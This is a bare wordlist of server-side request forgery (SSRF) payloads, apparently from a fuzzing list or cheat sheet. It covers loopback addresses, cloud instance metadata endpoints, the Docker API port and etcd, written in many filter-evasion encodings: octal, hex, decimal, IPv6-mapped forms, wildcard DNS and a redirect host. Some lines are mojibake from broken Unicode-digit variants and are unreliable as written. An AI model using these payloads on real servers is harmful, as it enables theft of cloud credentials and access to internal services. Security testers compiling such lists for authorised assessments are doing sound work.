gopher //127.0.0.1
gopher //localhost
gopher //metadata.google.internal
http //[::]:
http //[::]:2375/
http //[::1]
http //[::â â¥â¨ï½¡â¡â¤â£ï½¡â¯â¨ï½¡â¡â¤â£]
http //[::ââââ:â â¥â¨ãâ¡â¤â£ãâ¯â¨ãâ¡â¤â£]
http //[::ffff:127.0.0.1]
http //[::ffff:a9fe:a9fe]/computeMetadata/v1/
http //[::ffff:a9fe:a9fe]/latest/
http //[::ffff:a9fe:a9fe]/metadata/v1/
http //[0:0:0:0:0:ffff:127.0.0.1]
http //[0:0:0:0:0:ffff:127.0.0.1]:2375/
http //[0:0:0:0:0:ffff:169.254.169.254]/computeMetadata/v1/
http //[0:0:0:0:0:ffff:169.254.169.254]/latest/
http //[0:0:0:0:0:ffff:169.254.169.254]/metadata/v1/
http //[0:0:0:0:0:ffff:a9fe:a9fe]/computeMetadata/v1/
http //[0:0:0:0:0:ffff:a9fe:a9fe]/latest/
http //[0:0:0:0:0:ffff:a9fe:a9fe]/metadata/v1/
http //[0000::1]
http //[0000::1]:2375/
http //0.0.0.0
http //0/
http //0177.0.0.1/
http //017700000001:2375/
http //0251.0376.0251.0376/computeMetadata/v1/
http //0251.0376.0251.0376/latest/
http //0251.0376.0251.0376/metadata/v1/
http //0251.254.169.254/computeMetadata/v1/
http //0251.254.169.254/latest/
http //0251.254.169.254/metadata/v1/
http //025177524776/computeMetadata/v1/
http //025177524776/latest/
http //025177524776/metadata/v1/
http //0x7f000001:2375/
http //0xA9.0xFE.0xA9.0xFE/computeMetadata/v1/
http //0xA9.0xFE.0xA9.0xFE/latest/
http //0xA9.0xFE.0xA9.0xFE/metadata/v1/
http //0xA9FEA9FE/computeMetadata/v1/
http //0xA9FEA9FE/latest/
http //0xA9FEA9FE/metadata/v1/
http //0xc0a80014:2375/
http //100.100.100.200/latest/meta-data/
http //127.0.0.0
http //127.0.0.1
http //127.0.0.1:2375
http //127.0.0.1:2379
http //127.0.0.1.nip.io
http //127.0.1
http //127.0.1.3
http //127.1
http //127.127.127.127
http //169.254.169.254.nip.io/computeMetadata/v1/
http //169.254.169.254.nip.io/latest/
http //169.254.169.254.nip.io/metadata/v1/
http //169.254.169.254/2009-04-04/meta-data/
http //169.254.169.254/computeMetadata/v1/
http //169.254.169.254/latest/
http //169.254.169.254/metadata/instance?api-version=2017-04-02
http //169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
http //169.254.169.254/metadata/v1.json
http //169.254.169.254/metadata/v1/
http //169.254.169.254/openstack
http //169.254.170.2/v2
http //169ã254ã169ã254
http //169ï½¡254ï½¡169ï½¡254
http //192.0.0.192/latest/
http //2130706433:2375/
http //2130706433:2375/
http //2130706433/
http //2852039166/
http //2852039166/computeMetadata/v1/
http //2852039166/latest/
http //2852039166/metadata/v1/
http //3232235521/
http //3232235777/
http //â¡â§â¤â¡âªâ¢â¨â â¥â¥
http //â¯â¨ãâ¡â¤â£ãâ¯â¨ï½¡â¡â¤â£
http //â£â¡â¤ï½¡â¤â âªï½¡â£â¡â¤ï½¡â¤â âª
http //âªâ¡â¤â ãâªâ¢â¦â¥ãâªâ¡â¤â ãâªâ¢â¦â¥
http //âªâ§ââ¨ââââ¨ââ
http //âªâ§ââ¨ãâªâ¢â¦â¥ãâ£â¢â¤â â§
http //âªâ§ââ¨ï½¡â¯â¥â§â¨â¥â¥â¡
http //âªâ§ââ¨ï½¡âªâ§ââï½¡âªâ§ââ¨ï½¡âªâ§ââ
http //âªâªâ¡â¤â ãâ¯â¥â§â¨â¥â¥â¡
http //âªâªâ¡â¤â ï½¡âªâ§ââï½¡â£â¢â¤â â§
http //âªâªâ¡â¤â ï½¡âªâªâªâ¢â¦â¥ï½¡âªâªâªâªâ¡â¤â ï½¡âªâªâªâªâªâ¢â¦â¥
http //instance-data/latest/
http //localhost
http //localhost:9001/2018-06-01/runtime/
http //localtest.me
http //metadata.google.internal/computeMetadata/v1/
http //metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
http //metadata.google.internal/computeMetadata/v1beta1/
http //metadata/computeMetadata/v1/
http //nicob.net/redir-http-169.254.169.254:80-
http //rancher-metadata/
https //metadata.packet.net/userdata
jar ftp://127.0.0.1!/
jar http://127.0.0.1!/
jar https://127.0.0.1!/
